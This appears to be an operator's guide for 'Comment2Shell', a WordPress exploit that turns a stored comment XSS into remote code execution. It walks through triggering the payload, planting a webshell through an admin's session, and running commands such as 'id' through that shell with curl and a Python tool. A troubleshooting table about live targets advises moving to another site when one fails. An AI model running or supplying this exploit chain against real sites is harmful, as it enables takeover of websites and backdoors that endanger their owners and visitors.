# Browser Validation Guide - Comment2Shell

## Local Lab (Correct Port!)

**IMPORTANT: Lab runs on port 80, NOT 8080**

### Step 1: Login
```
http://localhost/wp-login.php
```
- Username: `admin`
- Password: `Password123!`

### Step 2: View Post (Triggers XSS)
```
http://localhost/?p=1
```

### Step 3: Check XSS Fired
**Exploit payload:** an alert dialog appears automatically:
```
Comment2Shell XSS - CVE-2026-93485
```
Click OK - the alert fires only once (a guard stops the autofocus
refocus loop), then the RCE chain runs in the background.

Watch the browser tab title for the chain status:
- `Comment2Shell: shell uploaded` - admin session detected, shell planted
- `Comment2Shell: admin login required` - this browser is not logged in as admin

The upload only works from a browser that is logged in as admin. The alert
fires for any visitor, but the nonce fetch needs the admin cookies.

**Probe payload:** open DevTools Console (F12) and run:
```javascript
document.title  // Should contain "C2S_XSS" if detection payload fired
```

### Step 4: Verify Webshell (after full exploit)
```bash
# Check if shell exists (replace with path from exploit output)
curl "http://localhost/wp-content/plugins/<dir>/<dir>.php?c=id"

# Or run command
python3 comment2shell.py --exec -t http://localhost \
  --shell-path <dir>/<dir>.php -c "id"
```

## Validation Pages

### 1. Autofocus Test
Open in browser: `browser_validate.html`
- Tests if `autofocus` works on different elements
- Watch `document.title` change

### 2. Full Payload Validation
Open `browser_validate.html` from a live target
- Contains extracted payload from live site
- Auto-monitors for XSS trigger

## Why Targets Failed

| Target | Issue | Fix |
|--------|-------|-----|
| localhost:8080 | Wrong port | Use port 80 |
| REST API disabled | No `?p=` patterns to guess | Pass `--post-id` manually |
| REST returns empty | No published posts | Target another site |
| Subdirectory install | Non-root `siteurl` | Pass `--post-id` manually |
| IP-only host | No WordPress detected | Not a target |
| Block theme target | Comment form closed | Enable comments or pick another post |

## Quick Test Command

```bash
# Scan a target
python3 comment2shell.py --scan -t TARGET_URL

# If vulnerable, exploit
python3 comment2shell.py -t TARGET_URL -c "id"
```
